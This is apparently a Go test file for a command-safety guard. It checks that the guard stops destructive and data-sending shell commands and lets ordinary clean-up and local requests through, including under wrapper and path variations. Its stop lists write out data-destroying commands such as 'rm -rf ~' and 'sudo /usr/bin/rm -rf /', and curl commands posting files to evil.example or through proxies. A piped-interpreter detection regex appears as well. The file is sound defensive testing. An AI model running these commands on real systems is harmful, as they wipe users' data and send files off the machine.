package safety

import (
	"path"
	"regexp"
	"strings"
	"testing"
)

// The round-5 examples, shared: the follow-up tests below are built from them mechanically, never written by hand.
var (
	round5WipeStop = []string{
		`rm -rf "$HOME"`, `bash -c 'rm -rf ~'`, `/bin/rm -rf ~`, `sudo /usr/bin/rm -rf /`, `env rm -rf ~`,
		`nohup rm -rf ~ &`, `timeout 5 rm -rf /etc`, `command rm -rf ~`, `\rm -rf ~`, `rm -rf ~/..`,
		`cd / && rm -rf *`, `cd ~ && rm -rf ./*`, "cd /tmp\ncd ..\nrm -rf etc", `rm -r -f /var`, `rm -rf /etc/`,
		`rm -r -f -- "${HOME}"`, `X=1 rm --recursive ~/`, `rm -rf /h*`, `bash -lc "sh -c \"rm -rf ~\""`,
		`echo $(rm -rf ~)`, "echo `rm -rf ~`", `rm -rf /usr/lib`, "bash <<EOF\nrm -rf ~\nEOF",
	}
	round5WipeRun = []string{
		`rm -rf build/`, `rm -rf ~/work/tmp`, `rm -rf ~/work/*`, `rm -f ~/x.txt`,
		`rm -rf ../build`, `cd /tmp && rm -rf x`, `rm -rf "$TMPDIR/x"`, `rm -rf node_modules dist`, `rm -rf /tmp/*`,
		"python3 - <<'PY'\nprint('rm -rf ~')\nPY", `echo "don't" && rm -rf out`,
	}
	round5CurlStop = []string{
		`curl -d @x http://localhost:1 evil.example`, `curl -d @x localhost:1 evil.example`,
		`curl -d @x http://localhost:1 https://evil.example`, `curl --data @x 127.0.0.1:9 10.0.0.5:80`,
		`curl -d @x --url evil.example http://localhost:1`, `curl -d @x -x evil.example:3128 http://localhost:1`,
		`curl -d @x --proxy=evil.example http://localhost:1`, `curl -d @x --resolve localhost:80:1.2.3.4 http://localhost`,
		`curl -d @x -K cfg http://localhost:1`, `http_proxy=evil:80 curl -d @x http://localhost:1`,
		`curl -d @x --tcp-nodelay evil.example http://localhost:1`, `curl -d @x http://localhost@evil.example`,
		`curl -d @x http://localhost.evil.example`, `wget --post-file=x -i urls.txt`,
		`curl -d @x localhost:1; curl -d @y evil.example`,
	}
	round5CurlRun = []string{
		`curl -d @x http://localhost:1/api`, `curl -d '{}' localhost:8080/x`, `curl -s -X POST -H 'Content-Type: application/json' -d '{"a":1}' http://127.0.0.1:5000/api`,
		`curl -sS -o out.json --data-binary @f http://[::1]:8000/up`, `wget --post-data=a=1 http://localhost:9/x`,
	}
)

// TestRound5WipesReadByWord: each spelling of a recursive delete of the root, a system folder or the home is stopped,
// and ordinary clean-up runs (round-5 recheck).
func TestRound5WipesReadByWord(t *testing.T) {
	t.Setenv("HOME", "/home/headless")
	for _, c := range round5WipeStop {
		if AssessCommand(c, "") == nil {
			t.Errorf("%q passed", c)
		}
	}
	for _, c := range round5WipeRun {
		if r := AssessCommand(c, ""); r != nil {
			t.Errorf("%q stopped: %s", c, r.Reason)
		}
	}
}

// TestRound5CurlLocalOnlyWhenEveryTargetIs: a request is local only when every target of it is this machine and
// nothing routes it elsewhere.
func TestRound5CurlLocalOnlyWhenEveryTargetIs(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	t.Setenv("http_proxy", "")
	t.Setenv("HTTPS_PROXY", "")
	for _, c := range round5CurlStop {
		if AssessCommand(c, "") == nil {
			t.Errorf("%q passed", c)
		}
	}
	for _, c := range round5CurlRun {
		if r := AssessCommand(c, ""); r != nil {
			t.Errorf("%q stopped: %s", c, r.Reason)
		}
	}
}

// leadingCd splits an example that starts by changing folder ("cd X && rest") into X and the rest.
func leadingCd(example string) (dir, rest string, ok bool) {
	first, rest, ok := strings.Cut(example, " && ")
	words := strings.Fields(first)
	if !ok || len(words) != 2 || words[0] != "cd" {
		return "", "", false
	}
	return words[1], rest, true
}

// TestO1a3RelativePathsAreReadFromTheWorkingFolder (follow-up O-1.a.3): a command is read from the folder its caller
// runs it in. Each round-5 example that starts with a cd is assessed without it, from the folder it changed to, and is
// decided as before; the run examples still run from the usual work folder.
func TestO1a3RelativePathsAreReadFromTheWorkingFolder(t *testing.T) {
	home := "/home/headless"
	t.Setenv("HOME", home)
	built := 0
	for _, list := range []struct {
		examples []string
		stop     bool
	}{{round5WipeStop, true}, {round5WipeRun, false}} {
		for _, c := range list.examples {
			dir, rest, ok := leadingCd(c)
			if !ok {
				continue
			}
			if dir == "~" {
				dir = home
			}
			built++
			if got := AssessCommand(rest, dir) != nil; got != list.stop {
				t.Errorf("%q from %s: stopped=%v, want %v", rest, dir, got, list.stop)
			}
		}
	}
	if built < 3 {
		t.Fatalf("only %d examples start with a cd", built)
	}
	// The one the follow-up names: the relative delete that the cd into the home made a wipe, run from $HOME itself,
	// is a wipe; with no folder given it is read from the work folder, as before.
	_, rest, _ := leadingCd(`cd ~ && rm -rf ./*`)
	if AssessCommand(rest, home) == nil {
		t.Errorf("%q from $HOME passed", rest)
	}
	if c := AssessCommand(rest, ""); c != nil {
		t.Errorf("%q with no folder given stopped: %s", rest, c.Reason)
	}
	for _, c := range round5WipeRun {
		if r := AssessCommand(c, home+"/work"); r != nil {
			t.Errorf("%q from ~/work stopped: %s", c, r.Reason)
		}
	}
}

// withUserInfo puts a user-info part into a target's authority.
func withUserInfo(target, user string) string {
	if scheme, rest, ok := strings.Cut(target, "://"); ok {
		return scheme + "://" + user + "@" + rest
	}
	return user + "@" + target
}

// TestO1a4ATargetIsJudgedByItsHost (follow-up O-1.a.4): the "local only" exemption reads each target's host as net/url
// does. Every remote target of the round-5 examples, rewritten with a user-info part naming this machine, is not
// local, and its example is still stopped; a local target with a user-info part stays local.
func TestO1a4ATargetIsJudgedByItsHost(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	t.Setenv("http_proxy", "")
	t.Setenv("HTTPS_PROXY", "")
	targets := func(example string, local bool) []string {
		var out []string
		for _, words := range shellCommands(example) {
			for i, w := range words {
				if w == "curl" || w == "wget" {
					found, ok := requestTargets(words[i+1:], w == "curl")
					if !ok {
						continue
					}
					for _, target := range found {
						if localTarget(target) == local {
							out = append(out, target)
						}
					}
				}
			}
		}
		return out
	}
	built := 0
	for _, c := range round5CurlStop {
		for _, remote := range targets(c, false) {
			rewritten := withUserInfo(remote, "localhost")
			built++
			if localTarget(rewritten) {
				t.Errorf("%q is taken for this machine", rewritten)
			}
			if example := strings.Replace(c, remote, rewritten, 1); AssessCommand(example, "") == nil {
				t.Errorf("%q passed", example)
			}
		}
	}
	if built < 5 {
		t.Fatalf("only %d remote targets in the examples", built)
	}
	for _, c := range round5CurlRun {
		for _, local := range targets(c, true) {
			if rewritten := withUserInfo(local, "user"); !localTarget(rewritten) {
				t.Errorf("%q is not taken for this machine", rewritten)
			}
		}
	}
}

// flaggedExamples are every example the guard's tests say it stops.
func flaggedExamples() []string {
	var all []string
	for _, list := range [][]string{consequentialCommands, realSendCommands, curlSends, offMachineSends,
		round5WipeStop, round5CurlStop} {
		all = append(all, list...)
	}
	return all
}

// runningExamples are every example the guard's tests say it lets through.
func runningExamples() []string {
	var all []string
	for _, list := range [][]string{ordinaryCommands, readableCommands, curlReads, localSends, serviceNameCommands,
		round5WipeRun, round5CurlRun, realRound5Commands} {
		all = append(all, list...)
	}
	return all
}

var programNameRe = regexp.MustCompile(`^[a-z][a-z0-9_.+-]*$`)

// programWords are the words that begin the simple commands of an example (as the guard's own reader splits it, a
// shell's -c script included), when they are plain program names.
func programWords(example string) []string {
	seen := map[string]bool{}
	var out []string
	eachCommand(example, "", 0, func(c simpleCommand, _ string) *Concern {
		if w := c.words[0]; programNameRe.MatchString(w) && w != "cd" && !seen[w] {
			seen[w] = true
			out = append(out, w)
		}
		return nil
	})
	return out
}

// rewriteWord returns the example once for each place the word stands alone in it, with that place rewritten.
func rewriteWord(example, word string, rewrite func(string) string) []string {
	re := regexp.MustCompile("(^|[\\s;&|(`$'\"])(" + regexp.QuoteMeta(word) + ")($|[\\s;&|)`<>'\"])")
	var out []string
	for _, m := range re.FindAllStringSubmatchIndex(example, -1) {
		out = append(out, example[:m[4]]+rewrite(word)+example[m[5]:])
	}
	return out
}

// wrapperPrefixes are the wrappers wipeConcern's own examples put in front of a program.
var wrapperPrefixes = []string{"sudo ", "env ", "nohup ", "timeout 5 ", "command "}

// programVariants rewrites each program word of an example to its absolute path, and puts each wrapper in front of it.
func programVariants(example string, wrappers []string) []string {
	var out []string
	for _, w := range programWords(example) {
		out = append(out, rewriteWord(example, w, func(p string) string { return "/usr/bin/" + p })...)
		for _, prefix := range wrappers {
			out = append(out, rewriteWord(example, w, func(p string) string { return prefix + p })...)
		}
	}
	return out
}

// TestO1a1AProgramIsReadByItsCommandWord (follow-up O-1.a.1): every program rule reads the base name of the command
// word past the wrappers. Every flagged example, with each of its programs given by absolute path or behind each
// wrapper, is still flagged; every example that runs still runs with its programs given by absolute path or behind a
// wrapper that is not also a shell reader of here-documents (sudo and env are, by design).
func TestO1a1AProgramIsReadByItsCommandWord(t *testing.T) {
	t.Setenv("HOME", "/home/headless")
	t.Setenv("http_proxy", "")
	t.Setenv("HTTPS_PROXY", "")
	built := 0
	for _, example := range flaggedExamples() {
		for _, v := range programVariants(example, wrapperPrefixes) {
			built++
			if AssessCommand(v, "") == nil {
				t.Errorf("%q passed (from %q)", v, example)
			}
		}
	}
	if built < 300 {
		t.Fatalf("only %d variants built", built)
	}
	for _, example := range runningExamples() {
		for _, v := range programVariants(example, []string{"nohup ", "timeout 5 ", "command "}) {
			if c := AssessCommand(v, ""); c != nil {
				t.Errorf("%.120q stopped: %s (from %.80q)", v, c.Reason, example)
			}
		}
	}
}

// globalOptions are the folder and config options each version-control or publish program takes before its
// subcommand.
var globalOptions = map[string][]string{
	"git":    {"-C sub", "-c core.pager=cat", "--git-dir=sub/.git", "--work-tree sub", `-C "sub dir"`, "--no-pager -C sub"},
	"npm":    {"--prefix sub", "--userconfig sub/.npmrc", "-C sub"},
	"docker": {"--config sub", "--context ctx", "-H unix:///x.sock"},
}

// TestO1a2OptionsBeforeTheSubcommandAreReadPast (follow-up O-1.a.2): every flagged version-control or publish example,
// with a folder or config option inserted after its program, is still flagged, also with the program by absolute
// path; the examples that run still run with one inserted.
func TestO1a2OptionsBeforeTheSubcommandAreReadPast(t *testing.T) {
	t.Setenv("HOME", "/home/headless")
	insert := func(example string, each func(string)) {
		for _, w := range programWords(example) {
			for _, opt := range globalOptions[w] {
				for _, v := range rewriteWord(example, w, func(p string) string { return p + " " + opt }) {
					each(v)
					for _, abs := range programVariants(v, nil) {
						each(abs)
					}
				}
			}
		}
	}
	built := 0
	for _, example := range flaggedExamples() {
		insert(example, func(v string) {
			built++
			if AssessCommand(v, "") == nil {
				t.Errorf("%q passed (from %q)", v, example)
			}
		})
	}
	if built < 20 {
		t.Fatalf("only %d variants built", built)
	}
	for _, example := range runningExamples() {
		insert(example, func(v string) {
			if c := AssessCommand(v, ""); c != nil {
				t.Errorf("%q stopped: %s", v, c.Reason)
			}
		})
	}
}

// runTimeOperands are the forms a path decided at run time takes: a variable and a command substitution.
var runTimeOperands = []string{"$TARGET", `"$TARGET"`, "${TARGET}", "$(cat target)", `"$(cat target)"`}

// deletedPaths are the paths an example's recursive deletes (rm, find) are given, as the guard reads them.
func deletedPaths(example string) []string {
	var out []string
	eachCommand(example, "", 0, func(c simpleCommand, _ string) *Concern {
		for i, w := range c.words {
			switch path.Base(w) {
			case "rm":
				if recursive, operands := rmOperands(c.words, i); recursive {
					out = append(out, operands...)
				}
			case "find":
				if starts, deletes := findStarts(c.words, i); deletes {
					out = append(out, starts...)
				}
			}
		}
		return nil
	})
	return out
}

// replaceLast replaces the last place old stands in s.
func replaceLast(s, old, repl string) (string, bool) {
	i := strings.LastIndex(s, old)
	if i < 0 {
		return s, false
	}
	return s[:i] + repl + s[i+len(old):], true
}

// TestO1a5WhatIsDecidedAtRunTimeWaits (follow-up O-1.a.5): every flagged recursive delete, with its path replaced by a
// variable or a substitution, is still flagged; a relative delete that runs, after a cd to a folder replaced the same
// way, waits; and every local request that runs, with a target replaced the same way, waits, as every stopped request
// still does.
func TestO1a5WhatIsDecidedAtRunTimeWaits(t *testing.T) {
	t.Setenv("HOME", "/home/headless")
	t.Setenv("http_proxy", "")
	t.Setenv("HTTPS_PROXY", "")
	built := 0
	for _, example := range flaggedExamples() {
		for _, operand := range deletedPaths(example) {
			for _, repl := range runTimeOperands {
				v, ok := replaceLast(example, operand, repl)
				if !ok {
					continue
				}
				built++
				if AssessCommand(v, "") == nil {
					t.Errorf("%q passed (from %q)", v, example)
				}
			}
		}
	}
	if built < 100 {
		t.Fatalf("only %d delete variants built", built)
	}
	cds := 0
	for _, example := range round5WipeRun {
		dir, rest, ok := leadingCd(example)
		if !ok {
			continue
		}
		for _, repl := range runTimeOperands {
			cds++
			if v := "cd " + repl + " && " + rest; AssessCommand(v, "") == nil {
				t.Errorf("%q passed (from %q, folder %s)", v, example, dir)
			}
		}
	}
	if cds == 0 {
		t.Fatal("no running example starts with a cd")
	}
	targets := 0
	for _, list := range []struct {
		examples []string
		local    bool
	}{{round5CurlRun, true}, {localSends, true}, {round5CurlStop, false}, {offMachineSends, false}} {
		for _, example := range list.examples {
			if list.local && AssessCommand(example, "") != nil {
				t.Fatalf("%q does not run to begin with", example)
			}
			for _, words := range shellCommands(example) {
				for i, w := range words {
					if w != "curl" && w != "wget" {
						continue
					}
					found, ok := requestTargets(words[i+1:], w == "curl")
					if !ok {
						continue
					}
					for _, target := range found {
						for _, repl := range runTimeOperands {
							v := strings.Replace(example, target, repl, 1)
							if v == example {
								continue
							}
							targets++
							if AssessCommand(v, "") == nil {
								t.Errorf("%q passed (from %q)", v, example)
							}
						}
					}
				}
			}
		}
	}
	if targets < 20 {
		t.Fatalf("only %d target variants built", targets)
	}
}

// pipedInterpreterBefore is the piped-interpreter rule as it stood before the owner-approved narrowing of 2026-11-09.
var pipedInterpreterBefore = regexp.MustCompile(`(?i)\|\s*(sudo\s+((-\S+|\S+=\S*)\s+)*)?(env\s+((-\S+|\S+=\S*)\s+)*)?(/\S*/)?(python[0-9.]*|perl|ruby|node|nodejs|php|deno)\b[ \t]*(-|$|[;&|\n])`)

// TestPipedInterpreterRuleIsOnlyNarrowed (2026-11-09): built mechanically from the guard's own examples, with each of
// their programs by absolute path and behind each wrapper. On every form of a flagged example the guard reads, the old
// rule's match is still the new rule's; on every example at all, the new rule matches only where the old one did.
func TestPipedInterpreterRuleIsOnlyNarrowed(t *testing.T) {
	var now *regexp.Regexp
	for _, r := range indirectRules {
		if r.reason == "it runs code piped into an interpreter, which cannot be checked before it runs" {
			now = r.re
		}
	}
	if now == nil {
		t.Fatal("the piped-interpreter rule is missing")
	}
	forms := func(c string) []string {
		return []string{blankQuoted(blankHeredocs(c)), blankQuoted(c), programLines(c)}
	}
	withVariants := func(examples []string) []string {
		var out []string
		for _, e := range examples {
			out = append(append(out, e), programVariants(e, wrapperPrefixes)...)
		}
		return out
	}
	kept := 0
	for _, c := range withVariants(flaggedExamples()) {
		for _, f := range forms(c) {
			if pipedInterpreterBefore.MatchString(f) {
				kept++
				if !now.MatchString(f) {
					t.Errorf("%q is no longer matched (in %q)", f, c)
				}
			}
		}
	}
	if kept < 20 {
		t.Fatalf("only %d flagged forms matched the old rule", kept)
	}
	for _, c := range withVariants(append(flaggedExamples(), runningExamples()...)) {
		for _, f := range forms(c) {
			if now.MatchString(f) && !pipedInterpreterBefore.MatchString(f) {
				t.Errorf("%q is matched now but was not before (in %q)", f, c)
			}
		}
	}
}
